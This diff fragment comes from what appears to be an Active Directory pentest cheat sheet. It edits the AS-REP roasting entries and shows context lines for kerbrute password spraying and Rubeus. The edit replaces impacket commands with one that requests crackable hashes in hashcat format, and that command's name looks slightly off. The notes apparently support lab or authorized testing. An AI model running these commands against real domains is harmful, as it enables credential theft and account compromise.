@@ -23,14 +23,9 @@ kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
 .\Rubeus.exe asreproast
 ```
 
-## Check for ASREPRoastable users with impacket
-```bash
-impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
+## ASREPRoast with Impacket 
 ```
-
-## Request ASREPRoast hashes for specific user
-```bash
-impacket-GetNPUsers domain.local/username -dc-ip $IP -no-pass
+impacket-Get-NPUsers.py -dc-ip $IP -request 'htb.local/' -format hashcat
 ```
 
 ## ASREPRoast with netexec
